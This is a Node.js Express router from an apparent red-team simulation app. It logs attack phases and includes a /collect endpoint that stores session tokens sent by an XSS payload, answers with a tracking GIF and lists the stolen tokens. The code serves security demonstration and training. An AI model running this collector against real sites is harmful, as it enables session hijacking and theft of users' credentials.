const express    = require('express');
const router     = express.Router();
const { writeLog } = require('../utils/logStore');

let attackSessions  = [];
let collectedTokens = [];

router.post('/start', (req, res) => {
  const session = {
    id:        `session-${Date.now()}`,
    startTime: new Date().toISOString(),
    phases:    [],
    mode:      process.env.APP_MODE,
    ip:        req.ip,
  };
  attackSessions.unshift(session);
  if (attackSessions.length > 20) attackSessions = attackSessions.slice(0, 20);
  writeLog({ event: 'RED_TEAM_SIMULATION_STARTED', severity: 'INFO', outcome: 'STARTED', ip: req.ip, mode: process.env.APP_MODE });
  res.json({ success: true, sessionId: session.id });
});

router.post('/phase', (req, res) => {
  const { sessionId, phase, success, details } = req.body;
  const phaseRecord = { phase, success, details, timestamp: new Date().toISOString(), mode: process.env.APP_MODE };
  const session = attackSessions.find(s => s.id === sessionId);
  if (session) session.phases.push(phaseRecord);
  writeLog({ event: `ATTACK_PHASE_${phase?.toUpperCase().replace(/\s/g, '_')}`, severity: success ? 'HIGH' : 'LOW', outcome: success ? 'SUCCEEDED' : 'BLOCKED', ip: req.ip, mode: process.env.APP_MODE, details });
  res.json({ success: true, phaseRecord });
});

router.get('/collect', (req, res) => {
  const { token } = req.query;
  if (token && token !== 'null') {
    collectedTokens.unshift({ token: token.substring(0, 50) + '...', fullToken: token, timestamp: new Date().toISOString(), ip: req.ip });
    if (collectedTokens.length > 50) collectedTokens = collectedTokens.slice(0, 50);
    writeLog({ event: 'XSS_TOKEN_HARVESTED', severity: 'CRITICAL', outcome: 'STOLEN', ip: req.ip, tokenPreview: token.substring(0, 30) + '...', mode: process.env.APP_MODE });
    console.log(`💀 [RED TEAM] Token harvested: ${token.substring(0, 30)}...`);
  }
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.writeHead(200, { 'Content-Type': 'image/gif' });
  res.end(gif);
});

router.get('/tokens',   (req, res) => res.json({ success: true, count: collectedTokens.length, tokens: collectedTokens }));
router.get('/sessions', (req, res) => res.json({ success: true, count: attackSessions.length,  sessions: attackSessions }));
router.delete('/reset', (req, res) => { attackSessions = []; collectedTokens = []; res.json({ success: true, message: 'Red team data cleared' }); });

module.exports = router;